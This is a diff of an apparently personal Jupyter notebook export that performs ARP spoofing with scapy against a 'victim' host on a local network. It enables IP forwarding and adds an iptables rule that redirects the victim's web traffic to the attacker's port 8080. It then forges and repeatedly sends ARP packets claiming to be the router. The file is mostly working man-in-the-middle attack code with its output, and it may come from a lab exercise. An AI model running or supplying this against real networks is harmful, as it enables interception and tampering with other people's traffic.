@@ -1,5 +1,5 @@
 
-# In[1]:
+# In[10]:
 
 from scapy.all import *
 import os
@@ -7,19 +7,13 @@ import time
 from ipInfo import *
 
 
-# Out[1]:
-
-#     WARNING: No route found for IPv6 destination :: (no default route?)
-#     WARNING:scapy.runtime:No route found for IPv6 destination :: (no default route?)
-# 
-
-# In[2]:
+# In[11]:
 
 #Ip Addresses etc. from my ipInfo helper module
 printIpInfo()
 
 
-# Out[2]:
+# Out[11]:
 
 #     interface : eth0                
 #     victimIp  : 192.168.1.101       
@@ -27,7 +21,7 @@ printIpInfo()
 #     myIp      : 192.168.1.104       
 # 
 
-# In[3]:
+# In[12]:
 
 #turn on IP port forwarding so we can behave like a router
 #and get our NIC to accept packets not addressed to us
@@ -35,7 +29,7 @@ os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
 
 #re-route traffic to our local tcp server
 os.system("/sbin/iptables -t nat -F") #clear existing rules
-os.system("/sbin/iptables -t nat -A PREROUTING -p tcp -s "+victimIp+" --dport 80 -j DNAT --to-destination " + myIp)
+os.system("/sbin/iptables -t nat -A PREROUTING -p tcp -s "+victimIp+" --dport 80 -j DNAT --to-destination " + myIp + ":8080")
 
 #disallow ICMP redirects
 #this keeps TCP/IP from picking a better route than through
@@ -43,11 +37,11 @@ os.system("/sbin/iptables -t nat -A PREROUTING -p tcp -s "+victimIp+" --dport 80
 #os.system("echo 0 > /proc/sys/net/ipv4/conf/"+interface+"/send_redirects")
 
 
-# Out[3]:
+# Out[12]:
 
 #     0
 
-# In[4]:
+# In[13]:
 
 #Build the ARP packet to be sent to the victim
 #saying I am the router
@@ -61,7 +55,7 @@ victimPacket.op = 1 # arp request (who-has)
 victimPacket.display()
 
 
-# Out[4]:
+# Out[13]:
 
 #     ###[ ARP ]###
 #       hwtype    = 0x1
@@ -75,12 +69,12 @@ victimPacket.display()
 #       pdst      = 192.168.1.101
 # 
 
-# In[*]:
+# In[14]:
 
 send(victimPacket)
 
 
-# Out[*]:
+# Out[14]:
 
 #     
 #     Sent 1 packets.
@@ -94,7 +88,7 @@ while(1):
     time.sleep(.5) # wait for 1 second
 
 
-# In[*]:
+# In[ ]:
 
 
 
